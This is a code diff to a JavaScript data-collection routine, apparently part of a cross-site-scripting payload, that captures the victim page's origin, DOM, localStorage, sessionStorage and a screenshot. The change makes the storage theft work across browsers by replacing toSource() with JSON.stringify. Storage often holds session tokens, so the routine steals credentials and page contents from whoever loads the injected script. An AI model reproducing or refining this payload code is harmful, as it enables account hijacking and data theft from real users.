@@ -31,8 +31,8 @@ function collect_data() {
     try { collected_data["Origin"] = return_value(location.origin); } catch(e) {}
     try { collected_data["DOM"] = return_value(document.documentElement.outerHTML); } catch(e) {}
     collected_data["DOM"] = collected_data["DOM"].slice(0, 8192)
-    try { collected_data["localStorage"] = return_value(localStorage.toSource()); } catch(e) {}
-    try { collected_data["sessionStorage"] = return_value(sessionStorage.toSource()); } catch(e) {}
+    try { collected_data["localStorage"] = return_value(JSON.stringify(localStorage)); } catch(e) {}
+    try { collected_data["sessionStorage"] = return_value(JSON.stringify(sessionStorage)); } catch(e) {}
     try {
       screenshot().then(function(img) {
         collected_data["Screenshot"] = img
